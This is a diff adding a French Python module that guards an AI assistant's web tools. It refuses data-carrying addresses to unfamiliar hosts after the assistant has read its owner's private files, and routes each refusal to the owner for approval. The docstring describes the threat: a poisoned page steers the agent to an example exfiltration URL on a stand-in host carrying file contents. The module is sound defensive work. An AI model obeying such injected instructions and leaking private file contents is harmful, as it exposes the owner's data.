@@ -1,0 +1,185 @@
+"""La règle de sortie (audit JARVIS 2, H1b, 2026-10-20 ; durcie après la relecture Opus du même jour).
+
+Le risque : après avoir lu un fichier PRIVÉ d'Ahmed, Hakim est poussé (par une page ou un document piégés) à ouvrir
+« https://inconnu.example/?d=<le contenu du fichier> » — une fuite. La règle, pour les outils web (lire_page, cliquer,
+preparer_video_web) :
+
+- L'état « lecture privée » dure FENETRE_S après la dernière lecture privée (pas seulement le tour : le contenu reste
+  dans son contexte). Le cockpit le note dans ~/AIOS/jarvis/lecture-privee.json quand Hakim (ou un de ses agents)
+  appelle preparer_fichier, chercher_dans_fichiers, chercher_dans_le_journal, fichiers_par_sens, memory_detail ou Read
+  sur ses fichiers ; la marque du tour (tour-externe.jsonl) compte aussi.
+- Dans cet état, une adresse vers un hôte qui n'est pas CONNU est refusée si elle peut porter des données : requête,
+  fragment, chemin autre que « / », sous-domaines en cascade ou à rallonge ; et au-delà de NOUVEAUX_MAX hôtes nouveaux
+  par fenêtre, même une adresse nue est refusée (le goutte-à-goutte par sous-domaines).
+- Un hôte est CONNU s'il a été visité pour la première fois il y a plus de AGE_CONNU_S, hors état de lecture privée
+  (la page piégée lue aujourd'hui ne le devient pas).
+- Un refus est déposé dans sorties-demandees.jsonl : Ahmed l'autorise ou non d'un geste dans Parler (empreinte) ;
+  autorisée, l'adresse exacte passe une fois dans les 15 minutes (sorties-permises.json, écrit par le cockpit).
+Ni le terminal de Hakim ni ses outils de fichiers n'écrivent ces fichiers. Le terminal : sa passerelle applique la
+règle aux NOMS d'hôtes avant de les résoudre (terminal.avant_connexion), et il n'a plus de résolveur DNS local ; le
+chemin et la requête d'une connexion chiffrée lui restent invisibles (limite dite).
+"""
+import json
+import os
+import time
+import uuid
+from pathlib import Path
+from urllib.parse import urlsplit
+
+_J = Path.home() / "AIOS" / "jarvis"
+MARQUE = Path(os.environ.get("ANAMNESE_MARQUE_EXTERNE") or _J / "tour-externe.jsonl")
+PRIVEE = Path(os.environ.get("JARVIS_LECTURE_PRIVEE") or _J / "lecture-privee.json")
+CONNUS = Path(os.environ.get("JARVIS_DOMAINES_CONNUS") or _J / "web-domaines.json")
+DEMANDES = Path(os.environ.get("JARVIS_SORTIES_DEMANDEES") or _J / "sorties-demandees.jsonl")
+PERMISES = Path(os.environ.get("JARVIS_SORTIES_PERMISES") or _J / "sorties-permises.json")
+LECTURES_PRIVEES = {"mcp__fichiers__preparer_fichier", "mcp__fichiers__chercher_dans_fichiers",
+                    "mcp__fichiers__chercher_dans_le_journal", "mcp__anamnese__fichiers_par_sens",
+                    "mcp__anamnese__memory_detail", "Read(fichiers)"}
+FENETRE_S = 6 * 3600
+AGE_CONNU_S = 24 * 3600
+NOUVEAUX_MAX = 5
+CONNUS_MAX = 5000
+
+
+class Refus(Exception):
+    pass
+
+
+def _json(chemin, defaut):
+    try:
+        return json.loads(Path(chemin).read_text(encoding="utf-8"))
+    except (OSError, ValueError):
+        return defaut
+
+
+def _ecrire(chemin, donnees):
+    f = Path(chemin)
+    tmp = f.with_name(f.name + f".{os.getpid()}.tmp")
+    try:
+        f.parent.mkdir(parents=True, exist_ok=True)
+        tmp.write_text(json.dumps(donnees, ensure_ascii=False), encoding="utf-8")
+        os.chmod(tmp, 0o600)
+        os.replace(tmp, f)
+    except OSError:
+        pass
+
+
+def lecture_privee(marque=None, privee=None, maintenant=None):
+    """Depuis quand (epoch) Hakim est en état de lecture privée, ou None."""
+    maintenant = time.time() if maintenant is None else maintenant
+    try:
+        for l in Path(marque or MARQUE).read_text(encoding="utf-8", errors="replace").splitlines():
+            try:
+                if json.loads(l).get("outil") in LECTURES_PRIVEES:
+                    return maintenant
+            except ValueError:
+                continue
+    except OSError:
+        pass
+    d = _json(privee or PRIVEE, {})
+    derniere = d.get("derniere") if isinstance(d, dict) else None
+    if isinstance(derniere, (int, float)) and maintenant - derniere < FENETRE_S:
+        return float(derniere)
+    return None
+
+
+def hote(url):
+    h = (urlsplit(str(url)).hostname or "").lower().rstrip(".")
+    return h[4:] if h.startswith("www.") else h
+
+
+def porte_des_donnees(url):
+    """Une adresse qui peut porter un texte : requête, fragment, chemin autre que la racine, ou un nom d'hôte en
+    cascade (plus de 4 étiquettes) ou à rallonge (une étiquette de plus de 20 caractères)."""
+    u = urlsplit(str(url))
+    if u.query or u.fragment or (u.path or "/") != "/":
+        return True
+    etiquettes = hote(url).split(".")
+    return len(etiquettes) > 4 or any(len(e) > 20 for e in etiquettes)
+
+
+def connus(chemin=None, maintenant=None):
+    maintenant = time.time() if maintenant is None else maintenant
+    d = _json(chemin or CONNUS, {})
+    doms = d.get("domaines", {}) if isinstance(d, dict) else {}
+    return {h for h, t in doms.items() if isinstance(t, (int, float)) and maintenant - t >= AGE_CONNU_S}
+
+
+def noter(url, chemin=None, marque=None, privee=None, maintenant=None):
+    """Une visite réussie HORS lecture privée : l'hôte entre dans la liste (connu après AGE_CONNU_S)."""
+    maintenant = time.time() if maintenant is None else maintenant
+    h = hote(url)
+    if not h or lecture_privee(marque, privee, maintenant) is not None:
+        return
+    d = _json(chemin or CONNUS, {})
+    doms = d.get("domaines", {}) if isinstance(d, dict) else {}
+    if h in doms:
+        return
+    doms[h] = maintenant
+    _ecrire(chemin or CONNUS, {"domaines": dict(sorted(doms.items(), key=lambda kv: kv[1])[-CONNUS_MAX:])})
+
+
+def _permise(url, permises, maintenant):
+    """L'adresse exacte autorisée par Ahmed (une fois, avant son échéance) : consommée."""
+    d = _json(permises or PERMISES, {})
+    if not isinstance(d, dict):
+        return False
+    fin = d.get(str(url))
+    if not isinstance(fin, (int, float)) or fin <= maintenant:
+        return False
+    d.pop(str(url), None)
+    _ecrire(permises or PERMISES, {k: v for k, v in d.items() if isinstance(v, (int, float)) and v > maintenant})
+    return True
+
+
+def _nouveaux_depuis(depuis, demandes, maintenant):
+    """Hôtes nouveaux (adresses nues) déjà laissés passer pendant cette fenêtre."""
+    d = _json(Path(demandes or DEMANDES).with_suffix(".nus.json"), {})
+    return {h for h, t in (d.items() if isinstance(d, dict) else []) if isinstance(t, (int, float)) and t >= depuis}
+
+
+def _compter_nu(h, demandes, maintenant):
+    f = Path(demandes or DEMANDES).with_suffix(".nus.json")
+    d = _json(f, {})
+    d = {k: v for k, v in (d.items() if isinstance(d, dict) else []) if isinstance(v, (int, float)) and maintenant - v < FENETRE_S}
+    d.setdefault(h, maintenant)
+    _ecrire(f, d)
+
+
+def _demander(url, raison, demandes, maintenant):
+    i = uuid.uuid4().hex[:10]
+    try:
+        f = Path(demandes or DEMANDES)
+        f.parent.mkdir(parents=True, exist_ok=True)
+        fd = os.open(f, os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o600)
+        try:
+            os.write(fd, (json.dumps({"id": i, "ts": maintenant, "url": str(url)[:2000], "raison": raison}, ensure_ascii=False) + "\n").encode())
+        finally:
+            os.close(fd)
+    except OSError:
+        pass
+    return i
+
+
+def verifier(url, marque=None, chemin=None, privee=None, demandes=None, permises=None, maintenant=None):
+    maintenant = time.time() if maintenant is None else maintenant
+    depuis = lecture_privee(marque, privee, maintenant)
+    if depuis is None:
+        return
+    h = hote(url)
+    if h and h in connus(chemin, maintenant):
+        return
+    if _permise(url, permises, maintenant):
+        return
+    if porte_des_donnees(url):
+        raison = "adresse avec des données vers un hôte inconnu, après la lecture d'un fichier privé"
+    # (contre-vérification Opus du 2026-10-20) le plafond compte sur toute la fenêtre : quand l'état vient de la marque
+    # du tour, « depuis » vaut maintenant et n'aurait rien compté
+    elif h not in (nus := _nouveaux_depuis(maintenant - FENETRE_S, demandes, maintenant)) and len(nus) >= NOUVEAUX_MAX:
+        raison = f"plus de {NOUVEAUX_MAX} hôtes nouveaux depuis la lecture d'un fichier privé"
+    else:
+        _compter_nu(h, demandes, maintenant)
+        return
+    i = _demander(url, raison, demandes, maintenant)
+    raise Refus(f"{raison} (« {h or str(url)[:60]} ») : c'est la forme d'une fuite. Ahmed peut l'autoriser d'un geste "
+                f"dans Parler (demande {i}) ; dis-le-lui, puis réessaie la MÊME adresse.")
